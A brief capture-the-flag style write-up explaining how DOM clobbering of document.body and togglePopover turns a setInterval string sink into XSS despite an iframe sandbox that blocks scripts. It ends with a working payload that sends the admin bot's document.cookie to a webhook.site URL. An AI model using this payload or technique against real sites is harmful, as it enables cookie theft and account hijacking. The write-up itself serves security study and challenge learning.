+ The goal is to gain an XSS to steal an admin bot's cookie.
+ By the following sandbox setting, you cannot run any JavaScript in iframe elements:
```
const sandboxAttribute = [
  "allow-downloads",
  "allow-forms",
  "allow-modals",
  "allow-orientation-lock",
  "allow-pointer-lock",
  "allow-popups",
  "allow-popups-to-escape-sandbox",
  "allow-presentation",
  "allow-same-origin",
  // "allow-scripts", // disallow
  "allow-top-navigation",
  "allow-top-navigation-by-user-activation",
  "allow-top-navigation-to-custom-protocols",
].join(" ");

```
+ Sink: `const id = setInterval(target.togglePopover, 400);`
+ If target.togglePopover is a string, it can be used as an eval.

And target is sandbox.contentDocument.body, which can be used to DOM clobber document.body with name, and then clobber togglePopover to complete the task.

+ Payload: `<iframe name=body srcdoc="<a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=${document.cookie}`)></a>"></iframe>`
